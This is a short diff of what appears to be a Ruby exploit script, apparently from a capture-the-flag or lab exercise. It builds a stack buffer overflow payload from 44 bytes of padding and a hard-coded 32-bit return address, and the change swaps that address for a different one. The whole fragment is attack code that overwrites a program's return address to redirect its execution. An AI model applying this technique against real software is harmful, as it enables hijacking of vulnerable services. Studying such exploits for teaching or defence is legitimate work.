@@ -9,7 +9,7 @@ port = PORT
 buf = ''
 44.times { buf << 'a' }
 # fill the return address
-buf << "\x34\xb0\x04\x08"
+buf << "\xcd\x88\x04\x08"
 buf << "\r\n"
 puts buf
 
